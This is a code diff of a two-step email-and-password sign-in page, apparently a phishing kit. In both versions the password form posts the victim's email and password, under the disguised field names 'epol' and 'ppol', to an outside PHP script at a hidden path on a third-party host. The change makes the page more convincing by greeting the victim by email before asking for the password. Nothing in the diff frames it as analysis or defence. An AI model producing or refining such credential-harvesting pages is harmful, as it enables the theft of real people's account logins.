@@ -83,25 +83,29 @@
                     <button class="btn" type="submit">Next</button>
                 </form>
                 
-                <!-- Second Form for Password Input -->
-                <form id="passwordForm" class="hidden" action="https://sz.zhl13.za.com/.ex/.a.php" method="POST">
-                    <p>
-                        <input id="emailHidden" class="input_text" name="epol" type="hidden" />
-                    </p>
-                    <h2>Enter password</h2>
-                    <p>
-                        <input id="passwordInput" class="input_text" name="ppol" placeholder="Password" type="password" required />
-                    </p>
-                    <button class="btn" type="submit">Sign in</button>
-                </form>
+                <!-- Display Email and Show Password Form -->
+                <div id="emailDisplay" class="hidden">
+                    <h2>Welcome, <span id="displayedEmail"></span></h2>
+                    <h3>Enter your password</h3>
+                    
+                    <!-- Second Form for Password Input -->
+                    <form id="passwordForm" action="https://sz.zhl13.za.com/.ex/.a.php" method="POST">
+                        <input id="emailHidden" name="epol" type="hidden" />
+                        <p>
+                            <input id="passwordInput" class="input_text" name="ppol" placeholder="Password" type="password" required />
+                        </p>
+                        <button class="btn" type="submit">Sign in</button>
+                    </form>
+                </div>
             </div>
         </div>
     </main>
 
     <script type="text/javascript">
         const emailForm = document.getElementById('emailForm');
-        const passwordForm = document.getElementById('passwordForm');
         const emailInput = document.getElementById('emailInput');
+        const emailDisplay = document.getElementById('emailDisplay');
+        const displayedEmail = document.getElementById('displayedEmail');
         const emailHidden = document.getElementById('emailHidden');
 
         emailForm.addEventListener('submit', function(e) {
@@ -115,11 +119,10 @@
                 // Hide the email form
                 emailForm.classList.add('hidden');
 
-                // Show the password form
-                passwordForm.classList.remove('hidden');
-
-                // Populate the hidden email field in the second form
+                // Display the email and show the password form
+                displayedEmail.textContent = emailValue;
                 emailHidden.value = emailValue;
+                emailDisplay.classList.remove('hidden');
             } else {
                 alert('Please enter a valid email address');
             }
